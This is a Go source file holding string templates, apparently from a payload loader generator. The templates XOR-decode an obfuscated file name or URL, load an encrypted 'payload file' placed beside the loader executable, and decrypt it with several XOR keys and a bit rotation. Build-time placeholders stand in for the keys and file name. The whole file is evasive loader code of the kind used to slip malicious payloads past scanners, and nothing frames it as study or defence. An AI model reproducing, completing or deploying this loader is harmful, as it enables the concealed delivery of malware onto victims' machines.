package encode

var (
	FenliDecodeString = []string{`
	"encoding/hex"
	"io/ioutil"
	"os"
	"path/filepath"
`, `

// unxorURL 对异或加密的URL进行解密
func UnxorURLOrFileName(hexStr string, key byte) (string, error) {
	encrypted, err := hex.DecodeString(hexStr)
	if err != nil {
		return "", err
	}

	result := make([]byte, len(encrypted))
	for i := 0; i < len(encrypted); i++ {
		result[i] = encrypted[i] ^ key
	}
	return string(result), nil
}

`, `
	encFileName := //__DATA_UrlOrFileEncrypted__
	deFileName, _ := UnxorURLOrFileName(string(encFileName), byte(//__URL_XOR_KEY__))
	// 载荷文件按 loader 可执行文件所在目录解析（双击/快捷方式运行时工作目录不定）
	curExe, _ := os.Executable()
	curDir := filepath.Dir(curExe)
	EncByteArray, err := ioutil.ReadFile(filepath.Join(curDir, deFileName))
	if err != nil {
		return
	}
	XorKeyData := //__DATA_XorKey__
	key1 := XorKeyData[0]
	key2 := XorKeyData[1]
	key3 := XorKeyData[2]
	key4 := XorKeyData[3]
	rotateN := uint(XorKeyData[4])
	byteArray := XorDecrypt(EncByteArray, key1, key2, key3, key4, rotateN)`,
	}
)
